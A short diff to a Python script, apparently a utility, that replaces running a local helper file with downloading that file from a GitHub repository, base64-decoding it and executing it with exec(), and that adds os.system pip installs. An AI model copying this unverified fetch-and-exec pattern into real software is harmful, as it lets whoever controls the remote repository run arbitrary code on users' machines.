@@ -1,6 +1,17 @@
 import os,time,subprocess
+try:
+    import base64
+except Exception:
+    os.system("pip install base64")
+try:
+    import requests
+except Exception:
+    os.system("pip install requests")
+import base64,requests
 def glob(tipo):
-    os.system(f"python Msg/glob.py {tipo}")
+    response = requests.get("https://api.github.com/repos/fromofca/Frt/contents/Msg/glob.py")
+    if "content" in response.json():
+        exec(base64.b64decode(response.json()["content"]).decode("utf-8"), glob2(tipo))
 def tim(tt):
     min = (tt//60)
     ss = (tt%60)
